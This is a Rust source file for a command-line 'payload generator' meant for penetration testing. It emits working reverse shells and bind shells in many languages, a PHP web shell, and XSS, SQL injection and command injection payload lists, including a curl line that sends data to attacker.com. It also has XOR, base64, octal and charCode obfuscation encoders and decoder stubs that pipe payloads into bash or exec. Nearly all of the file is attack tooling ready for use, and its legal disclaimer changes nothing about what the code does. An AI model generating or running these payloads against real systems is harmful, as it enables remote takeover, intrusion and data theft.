//! # RT03 Payload Generator
//!
//! A comprehensive payload generation and encoding tool for authorized
//! penetration testing. This tool helps security professionals create
//! encoded payloads for testing security controls.
//!
//! ## Legal Disclaimer
//!
//! THIS TOOL IS PROVIDED FOR AUTHORIZED SECURITY TESTING ONLY.
//! Creating and deploying payloads without authorization is illegal.
//! Always obtain written permission before testing systems you do not own.
//! The authors assume no liability for misuse of this software.
//!
//! ## Supported Encodings
//!
//! - Base64 (standard and URL-safe)
//! - Hex encoding
//! - URL encoding
//! - XOR encryption with custom key
//! - Unicode encoding
//! - HTML entity encoding
//! - Multiple encoding chains
//!
//! ## Payload Types
//!
//! - Reverse shells (Bash, Python, PowerShell, etc.)
//! - Web shells (PHP, ASP, JSP)
//! - Command injection payloads
//! - SQL injection payloads
//! - XSS payloads
//!
//! ## Usage Examples
//!
//! ```bash
//! # Generate base64-encoded reverse shell
//! payload-gen --type reverse-shell --lhost 10.0.0.1 --lport 4444 --encode base64
//!
//! # Generate XOR-encoded payload with custom key
//! payload-gen --type command --command "whoami" --encode xor --key mysecret
//!
//! # Chain multiple encodings
//! payload-gen --type reverse-shell --lhost 10.0.0.1 --lport 4444 --encode base64,url
//! ```

use anyhow::{Context, Result};
use clap::{Parser, ValueEnum};
use colored::*;
use rand::Rng;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fs::File;
use std::io::Write;
use std::path::PathBuf;

// ============================================================================
// LEGAL DISCLAIMER
// ============================================================================

const LEGAL_DISCLAIMER: &str = r#"
╔══════════════════════════════════════════════════════════════════════════════╗
║                           LEGAL DISCLAIMER                                    ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  This tool is provided for AUTHORIZED PENETRATION TESTING ONLY.              ║
║                                                                              ║
║  By using this tool, you acknowledge that:                                   ║
║  1. You have explicit written authorization to test the target systems       ║
║  2. Unauthorized access and malware deployment are criminal offenses         ║
║  3. You accept full responsibility for your actions                          ║
║  4. The authors are not liable for any misuse or damage caused               ║
║                                                                              ║
║  Creating payloads for unauthorized access can result in:                    ║
║  - Criminal prosecution                                                       ║
║  - Civil liability                                                           ║
║  - Imprisonment                                                               ║
║                                                                              ║
║  ONLY use this tool in authorized security assessments.                      ║
╚══════════════════════════════════════════════════════════════════════════════╝
"#;

// ============================================================================
// COMMAND LINE INTERFACE
// ============================================================================

/// Payload Generator for Authorized Penetration Testing
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Type of payload to generate
    #[arg(short, long)]
    payload_type: PayloadType,

    /// Listening host for reverse shells
    #[arg(long)]
    lhost: Option<String>,

    /// Listening port for reverse shells
    #[arg(long)]
    lport: Option<u16>,

    /// Custom command to encode
    #[arg(long)]
    command: Option<String>,

    /// Encoding(s) to apply (comma-separated for chaining)
    #[arg(short, long, default_value = "none")]
    encode: String,

    /// XOR encryption key
    #[arg(short, long)]
    key: Option<String>,

    /// Language/format for shell payloads
    #[arg(long, default_value = "bash")]
    language: ShellLanguage,

    /// Output file (optional)
    #[arg(short, long)]
    output: Option<PathBuf>,

    /// Generate multiple variants
    #[arg(long)]
    variants: bool,

    /// Skip legal disclaimer
    #[arg(long)]
    accept_disclaimer: bool,

    /// Verbose output
    #[arg(short, long)]
    verbose: bool,
}

/// Supported payload types
#[derive(Debug, Clone, ValueEnum)]
enum PayloadType {
    /// Reverse shell payload
    ReverseShell,
    /// Bind shell payload
    BindShell,
    /// Custom command
    Command,
    /// Web shell
    WebShell,
    /// XSS payload
    Xss,
    /// SQL injection payload
    Sqli,
    /// Command injection payload
    CmdInject,
}

/// Supported shell languages
#[derive(Debug, Clone, ValueEnum)]
enum ShellLanguage {
    Bash,
    Python,
    Python3,
    Perl,
    Php,
    Ruby,
    Powershell,
    Netcat,
    Java,
    Groovy,
}

// ============================================================================
// DATA STRUCTURES
// ============================================================================

/// Represents a generated payload
#[derive(Debug, Clone, Serialize, Deserialize)]
struct Payload {
    /// Payload type
    payload_type: String,
    /// Original (unencoded) payload
    original: String,
    /// Encoded payload
    encoded: String,
    /// Encoding chain applied
    encodings: Vec<String>,
    /// Language/format
    language: String,
    /// Metadata
    metadata: HashMap<String, String>,
}

/// Encoding operations
#[derive(Debug, Clone, Copy)]
enum EncodingType {
    None,
    Base64,
    Base64Url,
    Hex,
    Url,
    DoubleUrl,
    Xor,
    Unicode,
    HtmlEntity,
    OctalBash,
    CharCode,
}

impl EncodingType {
    /// Parse encoding type from string
    fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "none" => Some(Self::None),
            "base64" | "b64" => Some(Self::Base64),
            "base64url" | "b64url" => Some(Self::Base64Url),
            "hex" => Some(Self::Hex),
            "url" => Some(Self::Url),
            "doubleurl" | "durl" => Some(Self::DoubleUrl),
            "xor" => Some(Self::Xor),
            "unicode" => Some(Self::Unicode),
            "html" | "htmlentity" => Some(Self::HtmlEntity),
            "octal" => Some(Self::OctalBash),
            "charcode" => Some(Self::CharCode),
            _ => None,
        }
    }
}

// ============================================================================
// PAYLOAD TEMPLATES
// ============================================================================

/// Payload template manager
struct PayloadTemplates;

impl PayloadTemplates {
    /// Generate reverse shell payload
    fn reverse_shell(lang: &ShellLanguage, lhost: &str, lport: u16) -> String {
        match lang {
            ShellLanguage::Bash => format!(
                "bash -i >& /dev/tcp/{}/{} 0>&1",
                lhost, lport
            ),
            ShellLanguage::Python | ShellLanguage::Python3 => format!(
                r#"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"#,
                lhost, lport
            ),
            ShellLanguage::Perl => format!(
                r#"perl -e 'use Socket;$i="{}";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"#,
                lhost, lport
            ),
            ShellLanguage::Php => format!(
                r#"php -r '$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");'"#,
                lhost, lport
            ),
            ShellLanguage::Ruby => format!(
                r#"ruby -rsocket -e'f=TCPSocket.open("{}",{}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"#,
                lhost, lport
            ),
            ShellLanguage::Netcat => format!(
                "nc {} {} -e /bin/bash",
                lhost, lport
            ),
            ShellLanguage::Powershell => format!(
                r#"powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{}',{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()""#,
                lhost, lport
            ),
            ShellLanguage::Java => format!(
                r#"Runtime r = Runtime.getRuntime(); Process p = r.exec("/bin/bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'"); p.waitFor();"#,
                lhost, lport
            ),
            ShellLanguage::Groovy => format!(
                r#"String host="{}";int port={};String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);"#,
                lhost, lport
            ),
        }
    }

    /// Generate bind shell payload
    fn bind_shell(lang: &ShellLanguage, lport: u16) -> String {
        match lang {
            ShellLanguage::Bash => format!(
                "nc -lvnp {} -e /bin/bash",
                lport
            ),
            ShellLanguage::Python | ShellLanguage::Python3 => format!(
                r#"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",{}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])'"#,
                lport
            ),
            ShellLanguage::Perl => format!(
                r#"perl -MIO -e '$p=fork();exit,if$p;foreach my $key(keys %ENV){{delete $ENV{{$key}};}}$c=new IO::Socket::INET(LocalPort,{},Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){{$_=`$_`;print}};'"#,
                lport
            ),
            ShellLanguage::Php => format!(
                r#"<?php $sock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($sock,"0.0.0.0",{});socket_listen($sock,1);$client=socket_accept($sock);while(1){{socket_write($client,"shell> ");$input=socket_read($client,1024);$output=shell_exec($input);socket_write($client,$output);}};?>"#,
                lport
            ),
            ShellLanguage::Netcat => format!(
                "nc -lvnp {} -e /bin/bash",
                lport
            ),
            _ => format!("# Bind shell for {:?} not implemented", lang),
        }
    }

    /// Generate web shell payload
    fn web_shell(lang: &ShellLanguage) -> String {
        match lang {
            ShellLanguage::Php => r#"<?php if(isset($_REQUEST['cmd'])){ echo "<pre>".shell_exec($_REQUEST['cmd'])."</pre>"; } ?>"#.to_string(),
            _ => format!("# Web shell for {:?} - use PHP for web shells", lang),
        }
    }

    /// Generate XSS payloads
    fn xss_payloads() -> Vec<String> {
        vec![
            r#"<script>alert('XSS')</script>"#.to_string(),
            r#"<img src=x onerror=alert('XSS')>"#.to_string(),
            r#"<svg onload=alert('XSS')>"#.to_string(),
            r#"<body onload=alert('XSS')>"#.to_string(),
            r#"<iframe src="javascript:alert('XSS')">"#.to_string(),
            r#"<input onfocus=alert('XSS') autofocus>"#.to_string(),
            r#"<marquee onstart=alert('XSS')>"#.to_string(),
            r#"<div style="width:expression(alert('XSS'))">"#.to_string(),
            r#"<a href="javascript:alert('XSS')">click</a>"#.to_string(),
            r#"<details open ontoggle=alert('XSS')>"#.to_string(),
        ]
    }

    /// Generate SQL injection payloads
    fn sqli_payloads() -> Vec<String> {
        vec![
            "' OR '1'='1".to_string(),
            "' OR '1'='1' --".to_string(),
            "' OR '1'='1' /*".to_string(),
            "1' ORDER BY 1--".to_string(),
            "1' ORDER BY 10--".to_string(),
            "1' UNION SELECT NULL--".to_string(),
            "1' UNION SELECT NULL,NULL--".to_string(),
            "1' UNION SELECT username,password FROM users--".to_string(),
            "'; DROP TABLE users--".to_string(),
            "1'; WAITFOR DELAY '0:0:5'--".to_string(),
            "1' AND SLEEP(5)--".to_string(),
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--".to_string(),
        ]
    }

    /// Generate command injection payloads
    fn cmd_injection_payloads() -> Vec<String> {
        vec![
            "; whoami".to_string(),
            "| whoami".to_string(),
            "|| whoami".to_string(),
            "& whoami".to_string(),
            "&& whoami".to_string(),
            "`whoami`".to_string(),
            "$(whoami)".to_string(),
            "; cat /etc/passwd".to_string(),
            "| cat /etc/passwd".to_string(),
            "; ping -c 5 127.0.0.1".to_string(),
            "| ping -c 5 127.0.0.1".to_string(),
            "$(ping -c 5 127.0.0.1)".to_string(),
            "; curl http://attacker.com/?data=$(whoami)".to_string(),
        ]
    }
}

// ============================================================================
// ENCODING FUNCTIONS
// ============================================================================

/// Encoder for payload obfuscation
struct PayloadEncoder;

impl PayloadEncoder {
    /// Apply base64 encoding
    fn base64_encode(data: &str) -> String {
        use base64::{engine::general_purpose::STANDARD, Engine};
        STANDARD.encode(data)
    }

    /// Apply URL-safe base64 encoding
    fn base64url_encode(data: &str) -> String {
        use base64::{engine::general_purpose::URL_SAFE, Engine};
        URL_SAFE.encode(data)
    }

    /// Apply hex encoding
    fn hex_encode(data: &str) -> String {
        hex::encode(data)
    }

    /// Apply URL encoding
    fn url_encode(data: &str) -> String {
        urlencoding::encode(data).to_string()
    }

    /// Apply double URL encoding
    fn double_url_encode(data: &str) -> String {
        urlencoding::encode(&urlencoding::encode(data)).to_string()
    }

    /// Apply XOR encoding with key
    fn xor_encode(data: &str, key: &str) -> String {
        let key_bytes = key.as_bytes();
        let encoded: Vec<u8> = data
            .as_bytes()
            .iter()
            .enumerate()
            .map(|(i, b)| b ^ key_bytes[i % key_bytes.len()])
            .collect();
        hex::encode(encoded)
    }

    /// Apply Unicode encoding (\uXXXX)
    fn unicode_encode(data: &str) -> String {
        data.chars()
            .map(|c| format!("\\u{:04x}", c as u32))
            .collect()
    }

    /// Apply HTML entity encoding
    fn html_entity_encode(data: &str) -> String {
        data.chars()
            .map(|c| format!("&#{};", c as u32))
            .collect()
    }

    /// Apply octal encoding for bash
    fn octal_bash_encode(data: &str) -> String {
        let octal: String = data
            .bytes()
            .map(|b| format!("\\{:03o}", b))
            .collect();
        format!("$'{}'", octal)
    }

    /// Apply JavaScript charCode encoding
    fn charcode_encode(data: &str) -> String {
        let codes: Vec<String> = data
            .chars()
            .map(|c| (c as u32).to_string())
            .collect();
        format!("String.fromCharCode({})", codes.join(","))
    }

    /// Apply encoding chain
    fn encode_chain(data: &str, encodings: &[EncodingType], key: Option<&str>) -> String {
        let mut result = data.to_string();

        for encoding in encodings {
            result = match encoding {
                EncodingType::None => result,
                EncodingType::Base64 => Self::base64_encode(&result),
                EncodingType::Base64Url => Self::base64url_encode(&result),
                EncodingType::Hex => Self::hex_encode(&result),
                EncodingType::Url => Self::url_encode(&result),
                EncodingType::DoubleUrl => Self::double_url_encode(&result),
                EncodingType::Xor => {
                    let k = key.unwrap_or("defaultkey");
                    Self::xor_encode(&result, k)
                }
                EncodingType::Unicode => Self::unicode_encode(&result),
                EncodingType::HtmlEntity => Self::html_entity_encode(&result),
                EncodingType::OctalBash => Self::octal_bash_encode(&result),
                EncodingType::CharCode => Self::charcode_encode(&result),
            };
        }

        result
    }
}

// ============================================================================
// PAYLOAD GENERATOR
// ============================================================================

/// Main payload generation logic
struct PayloadGenerator {
    verbose: bool,
}

impl PayloadGenerator {
    fn new(verbose: bool) -> Self {
        Self { verbose }
    }

    /// Generate payload based on arguments
    fn generate(&self, args: &Args) -> Result<Vec<Payload>> {
        let mut payloads = Vec::new();

        match &args.payload_type {
            PayloadType::ReverseShell => {
                let lhost = args.lhost.as_ref()
                    .context("--lhost required for reverse shell")?;
                let lport = args.lport
                    .context("--lport required for reverse shell")?;

                if args.variants {
                    // Generate all language variants
                    for lang in &[
                        ShellLanguage::Bash,
                        ShellLanguage::Python3,
                        ShellLanguage::Perl,
                        ShellLanguage::Php,
                        ShellLanguage::Ruby,
                        ShellLanguage::Netcat,
                        ShellLanguage::Powershell,
                    ] {
                        let original = PayloadTemplates::reverse_shell(lang, lhost, *lport);
                        payloads.push(self.create_payload(
                            "reverse_shell",
                            &original,
                            args,
                            format!("{:?}", lang).to_lowercase(),
                        )?);
                    }
                } else {
                    let original = PayloadTemplates::reverse_shell(&args.language, lhost, *lport);
                    payloads.push(self.create_payload(
                        "reverse_shell",
                        &original,
                        args,
                        format!("{:?}", args.language).to_lowercase(),
                    )?);
                }
            }

            PayloadType::BindShell => {
                let lport = args.lport
                    .context("--lport required for bind shell")?;

                let original = PayloadTemplates::bind_shell(&args.language, *lport);
                payloads.push(self.create_payload(
                    "bind_shell",
                    &original,
                    args,
                    format!("{:?}", args.language).to_lowercase(),
                )?);
            }

            PayloadType::Command => {
                let command = args.command.as_ref()
                    .context("--command required for command type")?;

                payloads.push(self.create_payload(
                    "command",
                    command,
                    args,
                    "custom".to_string(),
                )?);
            }

            PayloadType::WebShell => {
                let original = PayloadTemplates::web_shell(&args.language);
                payloads.push(self.create_payload(
                    "web_shell",
                    &original,
                    args,
                    format!("{:?}", args.language).to_lowercase(),
                )?);
            }

            PayloadType::Xss => {
                for (i, payload) in PayloadTemplates::xss_payloads().iter().enumerate() {
                    payloads.push(self.create_payload(
                        "xss",
                        payload,
                        args,
                        format!("variant_{}", i + 1),
                    )?);
                }
            }

            PayloadType::Sqli => {
                for (i, payload) in PayloadTemplates::sqli_payloads().iter().enumerate() {
                    payloads.push(self.create_payload(
                        "sqli",
                        payload,
                        args,
                        format!("variant_{}", i + 1),
                    )?);
                }
            }

            PayloadType::CmdInject => {
                for (i, payload) in PayloadTemplates::cmd_injection_payloads().iter().enumerate() {
                    payloads.push(self.create_payload(
                        "cmd_injection",
                        payload,
                        args,
                        format!("variant_{}", i + 1),
                    )?);
                }
            }
        }

        Ok(payloads)
    }

    /// Create a single payload with encoding
    fn create_payload(
        &self,
        payload_type: &str,
        original: &str,
        args: &Args,
        language: String,
    ) -> Result<Payload> {
        // Parse encoding chain
        let encoding_names: Vec<&str> = args.encode.split(',').collect();
        let mut encodings = Vec::new();
        let mut encoding_labels = Vec::new();

        for name in &encoding_names {
            if let Some(enc) = EncodingType::from_str(name.trim()) {
                encodings.push(enc);
                encoding_labels.push(name.trim().to_string());
            } else {
                anyhow::bail!("Unknown encoding: {}", name);
            }
        }

        // Apply encoding chain
        let encoded = PayloadEncoder::encode_chain(
            original,
            &encodings,
            args.key.as_deref(),
        );

        let mut metadata = HashMap::new();
        metadata.insert("original_length".to_string(), original.len().to_string());
        metadata.insert("encoded_length".to_string(), encoded.len().to_string());

        if let Some(key) = &args.key {
            metadata.insert("xor_key".to_string(), key.clone());
        }

        Ok(Payload {
            payload_type: payload_type.to_string(),
            original: original.to_string(),
            encoded,
            encodings: encoding_labels,
            language,
            metadata,
        })
    }
}

// ============================================================================
// OUTPUT FUNCTIONS
// ============================================================================

/// Display payload results
fn display_payloads(payloads: &[Payload]) {
    println!("\n{}", "═".repeat(80).cyan());
    println!("{}", " GENERATED PAYLOADS ".cyan().bold());
    println!("{}", "═".repeat(80).cyan());

    for (i, payload) in payloads.iter().enumerate() {
        println!("\n{} Payload #{}", "[+]".green(), i + 1);
        println!("    {} {}", "Type:".dimmed(), payload.payload_type);
        println!("    {} {}", "Language:".dimmed(), payload.language);
        println!("    {} {:?}", "Encodings:".dimmed(), payload.encodings);

        println!("\n    {}:", "Original".yellow());
        // Wrap long payloads
        let original_lines: Vec<&str> = payload.original
            .as_bytes()
            .chunks(70)
            .map(|chunk| std::str::from_utf8(chunk).unwrap_or(""))
            .collect();
        for line in original_lines {
            println!("        {}", line);
        }

        println!("\n    {}:", "Encoded".green());
        let encoded_lines: Vec<&str> = payload.encoded
            .as_bytes()
            .chunks(70)
            .map(|chunk| std::str::from_utf8(chunk).unwrap_or(""))
            .collect();
        for line in encoded_lines {
            println!("        {}", line);
        }

        println!("\n    {}:", "Metadata".dimmed());
        for (key, value) in &payload.metadata {
            println!("        {}: {}", key, value);
        }

        println!("\n{}", "─".repeat(80).dimmed());
    }
}

/// Generate decoder stub
fn generate_decoder_stub(payload: &Payload) {
    println!("\n{}", "═".repeat(80).cyan());
    println!("{}", " DECODER STUB ".cyan().bold());
    println!("{}", "═".repeat(80).cyan());

    if payload.encodings.contains(&"base64".to_string()) {
        println!("\n{} Bash Base64 Decode:", "[*]".blue());
        println!("    echo '{}' | base64 -d | bash", payload.encoded);

        println!("\n{} Python Base64 Decode:", "[*]".blue());
        println!("    import base64; exec(base64.b64decode('{}').decode())",
            payload.encoded);

        println!("\n{} PowerShell Base64 Decode:", "[*]".blue());
        println!("    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{}'))",
            payload.encoded);
    }

    if payload.encodings.contains(&"xor".to_string()) {
        println!("\n{} XOR Decode (Python):", "[*]".blue());
        if let Some(key) = payload.metadata.get("xor_key") {
            println!(r#"    key = "{}"
    data = bytes.fromhex("{}")
    decoded = "".join(chr(b ^ ord(key[i % len(key)])) for i, b in enumerate(data))
    exec(decoded)"#, key, payload.encoded);
        }
    }
}

/// Save payloads to file
fn save_payloads(payloads: &[Payload], output: PathBuf) -> Result<()> {
    let mut file = File::create(&output)
        .with_context(|| format!("Failed to create output file: {:?}", output))?;

    let json = serde_json::to_string_pretty(payloads)?;
    file.write_all(json.as_bytes())?;

    println!("{} Payloads saved to {:?}", "[+]".green(), output);
    Ok(())
}

// ============================================================================
// MAIN ENTRY POINT
// ============================================================================

fn main() -> Result<()> {
    // Parse arguments
    let args = Args::parse();

    // Display legal disclaimer
    println!("{}", LEGAL_DISCLAIMER.red());

    if !args.accept_disclaimer {
        println!("{}", "Do you have authorization to use these payloads? (yes/no): ".yellow());
        let mut input = String::new();
        std::io::stdin().read_line(&mut input)?;

        if input.trim().to_lowercase() != "yes" {
            println!("{} Exiting - authorization required", "[!]".red());
            return Ok(());
        }
    }

    println!("\n{}", "═".repeat(80).cyan());
    println!("{} {:?}", " PAYLOAD TYPE:".cyan().bold(),
        format!("{:?}", args.payload_type).white().bold());
    println!("{}", "═".repeat(80).cyan());

    // Generate payloads
    let generator = PayloadGenerator::new(args.verbose);
    let payloads = generator.generate(&args)?;

    // Display results
    display_payloads(&payloads);

    // Generate decoder stub for first payload
    if let Some(payload) = payloads.first() {
        if payload.encodings.iter().any(|e| e != "none") {
            generate_decoder_stub(payload);
        }
    }

    // Save to file if requested
    if let Some(output) = &args.output {
        save_payloads(&payloads, output.clone())?;
    }

    println!("\n{} {} payload(s) generated!", "[+]".green().bold(), payloads.len());

    Ok(())
}

// ============================================================================
// TESTS
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_base64_encoding() {
        let encoded = PayloadEncoder::base64_encode("test");
        assert_eq!(encoded, "dGVzdA==");
    }

    #[test]
    fn test_hex_encoding() {
        let encoded = PayloadEncoder::hex_encode("test");
        assert_eq!(encoded, "74657374");
    }

    #[test]
    fn test_url_encoding() {
        let encoded = PayloadEncoder::url_encode("test&value=1");
        assert_eq!(encoded, "test%26value%3D1");
    }

    #[test]
    fn test_xor_encoding() {
        let encoded = PayloadEncoder::xor_encode("test", "key");
        let decoded_bytes: Vec<u8> = hex::decode(&encoded).unwrap();
        let key = "key".as_bytes();
        let decoded: String = decoded_bytes
            .iter()
            .enumerate()
            .map(|(i, b)| (b ^ key[i % key.len()]) as char)
            .collect();
        assert_eq!(decoded, "test");
    }

    #[test]
    fn test_encoding_chain() {
        let encodings = vec![EncodingType::Base64, EncodingType::Url];
        let encoded = PayloadEncoder::encode_chain("test", &encodings, None);
        assert!(encoded.contains("%")); // URL encoded
    }

    #[test]
    fn test_xss_payloads() {
        let payloads = PayloadTemplates::xss_payloads();
        assert!(!payloads.is_empty());
        assert!(payloads[0].contains("<script>"));
    }

    #[test]
    fn test_sqli_payloads() {
        let payloads = PayloadTemplates::sqli_payloads();
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.contains("OR")));
    }
}
